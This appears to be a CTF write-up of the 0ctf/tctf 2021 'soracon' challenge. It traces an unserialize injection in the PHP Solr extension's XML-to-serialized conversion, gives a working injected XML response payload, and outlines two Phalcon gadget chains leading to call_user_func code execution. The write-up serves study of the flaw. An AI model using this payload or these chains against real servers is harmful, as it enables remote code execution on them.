### References

- [@zsx, Official WP, 2021-07-05](https://github.com/zsxsoft/my-ctf-challenges/tree/master/0ctf2021/soracon)
- [@byc_404, 0ctf/tctf-soracon, 2021-07-07](https://bycsec.top/2021/07/07/0ctf-tctf-soracon/)

**Tag: Unserialize injection, Solr extensions**

1.We can control the Solr response content, review the solr extensions's source code:

```c
PHP_METHOD(SolrResponse, getResponse) ->
solr_response_get_response_impl(INTERNAL_FUNCTION_PARAM_PASSTHRU,1)  ->
php_var_unserialize(return_value, &raw_resp, str_end, &var_hash)
```

It use `php_var_unserialize` to make `SolrObject`. `raw_resp` from `buffer.str`, `buffer` is processed in many different ways according to the if condition.

Trun on `display_errors` and test locally, it show:

```tex
Warning: SolrResponse::getResponse(): Error loading root of XML document in /var/www/html/index.php on line 9

Warning: SolrResponse::getResponse(): Error unserializing raw response. in /var/www/html/index.php on line 9

Fatal error: Uncaught SolrException: Error un-serializing response in /var/www/html/index.php:9 Stack trace: #0 /var/www/html/index.php(9): SolrResponse->getResponse() #1 {main} thrown in /var/www/html/index.php on line 9
```

this can therefore be determined that it will convert XML response. go to [`solr_encode_generic_xml_response`](https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/php_solr_response.c#L239)

```c
solr_encode_generic_xml_response(&buffer, ...)  ->
// <src/php7/solr_functions_helpers.c>
solr_encode_object(root, buffer, SOLR_ENCODE_STANDALONE, 0L, parse_mode)  ->
solr_encoder_functions[solr_get_xml_type((__node))]
```

the [`solr_encode_objec`](https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/solr_functions_helpers.c#L1231) called [`solr_write_object_opener`](https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/solr_functions_helpers.c#L654) to write a serialized string to the `buffer`, then called the [`solr_encode_xml_node`](https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/solr_functions_helpers.c#L462) function to select the corresponding function for the different node types and convert the xml to php serialize.

```c
/* {{{ global variables solr_encoder_functions[], solr_document_field_encoders[] */
static solr_php_encode_func_t solr_encoder_functions[] = {
	solr_encode_string,
	solr_encode_null,
	solr_encode_bool,
	solr_encode_int,
	solr_encode_float,
	solr_encode_string,
	solr_encode_array,
	solr_encode_object,
	solr_encode_document,
	solr_encode_result,
	NULL
};
```

Pick any one, e.g. [`solr_encode_int`](https://github.com/php/pecl-search_engine-solr/blob/2.5.1/src/php7/solr_functions_helpers.c#L1142)

```c
/* {{{ static void solr_encode_int(const xmlNode *node, solr_string_t *buffer, solr_encoding_type_t enc_type, long int array_index, long int parse_mode) */
static void solr_encode_int(const xmlNode *node, solr_string_t *buffer, solr_encoding_type_t enc_type, long int array_index, long int parse_mode)
{
	solr_char_t *data_value = (solr_char_t *) solr_xml_get_node_contents(node);
	size_t data_value_len   = solr_strlen(data_value);
	solr_write_variable_opener(node, buffer, enc_type, array_index);
	solr_string_append_const(buffer, "i:");
	solr_string_appends(buffer, data_value, data_value_len);
	solr_string_appendc(buffer, ';');
}
/* }}} */
```

The `data_value` spliced directly into the serialised string without verifying that it is an integer. Here will convert `<int>123456</int>` to `i:12345`

So we can do Unserialize injection, just manually close all brackets. PHP will stop reading all the remaining characters if unserialization is done(**brackets are all closed**).

Use tcpdump sniffing in docker and look at the packets in wireshark: (<del>too lazy to install solr locally and debug<del> :p)

![](https://i.loli.net/2021/09/27/FqhypGPKDeIfBYi.png)

Then we can insert serialised data, which requires the closure of **5 brackets** (use fuzzing)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<response>
<result name="response" numFound="1" start="0" numFoundExact="true">
  <doc name="test">
    <int name="a">123;i:1;O:4:"XXXX":0:{}}}}}}</int>
    <int name="b">0</int>
  </doc>
</result>
</response>
```

now we can triggered unserialization, all we need is gadget chain.

2.in phpinfo.php we can find `phalcon` extension v4.1.2 installed. View it source code https://github.com/phalcon/cphalcon/tree/4.1.2-release, it's written in Zephir and will be compiled to C.

gadget chain:

```php
\Phalcon\Logger\Adapter\AbstractAdapter#__destruct()
    => this->commit() => <abstract>this->process(item)
\Phalcon\Logger\Adapter\Stream<extends AbstractAdapter>#process(<Item> item)
    => this->getFormatter()->format(item)
\Phalcon\Logger\Formatter\Line#format(<Item> item)
    => item->getMessage() <__call>
\Phalcon\Di#__call(string! method, array arguments = []) <getter>
    => this->get(possibleService, arguments) => service->resolve(parameters, this)
\Phalcon\Di\Service#resolve(parameters = null, <DiInterface> container = null)
    => builder->build(container, definition, parameters)
\Phalcon\Di\Service\Builder#build()
    => create_instance(className) & call_user_func_array(methodCall, this->buildParameters(container, arguments))
\Phalcon\Validation::class
    => add(var field, <ValidatorInterface> validator)
    => validate(var data = null, var entity = null) => validator->validate(this, field)
\Phalcon\Validation\Validator\Callback::validate(<Validation> validation, var field)
    => call_user_func(callback, data)
```

use the chain.php generating serialised payloads and use the rep.py responsed the payload

![](https://i.loli.net/2021/09/27/YZviw5e9NpIKhb4.png)

another chain from ROIS:

```php
\Phalcon\Logger\Adapter\AbstractAdapter#__destruct()
    => this->commit() => <abstract>this->process(item)
\Phalcon\Logger\Adapter\Stream<extends AbstractAdapter>#process(<Item> item)
    => this->getFormatter()->format(item)
\Phalcon\Logger\Formatter\Line#format(<Item> item)
    => item->getMessage() <__toString>
\Phalcon\Forms\Element\Date<extends AbstractElement>#__toString()
    => this->{"render"}() => this->prepareAttributes() => this->getValue() => form->getValue(name)
\Phalcon\Validation#getValue(string field)
    => this->entity->{method}()
\Phalcon\DataMapper\Pdo\ConnectionLocator#getWrite(string name = "")
    => this->getConnection("write", name) => call_user_func(collection[requested])
\Phalcon\Loader#loadFiles()
    => call_user_func(fileCheckingCallback, filePath)
```
